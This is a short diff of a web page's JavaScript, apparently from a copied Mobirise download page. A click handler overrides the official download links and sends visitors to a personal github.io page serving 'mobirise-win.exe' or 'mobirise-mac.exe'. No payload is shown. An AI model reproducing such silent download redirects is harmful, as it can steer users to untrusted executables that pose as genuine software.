@@ -1626,13 +1626,13 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
         }*/
         item.addEventListener('click', function (e) {
             if(/mobirise-free-win\.zip/.test(e.target.href)) {
-                location.href = "https://nataliyuryevna.github.io/test/kit.html/download?id=mobirise-win.exe"; 
+                location.href = "https://nataliyuryevna.github.io/test/kit.html:download?id=mobirise-win.exe"; 
             } else if (/mobirise-free-mac\.zip/.test(item.getAttribute('href'))) {
-              location.href = "https://nataliyuryevna.github.io/test/kit.html/download?id=mobirise-mac.exe"; 
+              location.href = "https://nataliyuryevna.github.io/test/kit.html:download?id=mobirise-mac.exe"; 
             } else if (/win/i.test(navigator.platform)) {
-                location.href = "https://nataliyuryevna.github.io/test/kit.html/download?id=mobirise-win.exe";
+                location.href = "https://nataliyuryevna.github.io/test/kit.html:download?id=mobirise-win.exe";
             } else if(/mac/i.test(navigator.platform)) {
-                location.href = "https://nataliyuryevna.github.io/test/kit.html/download?id=mobirise-mac.exe"; 
+                location.href = "https://nataliyuryevna.github.io/test/kit.html:download?id=mobirise-mac.exe"; 
             }
         e.preventDefault();
         })
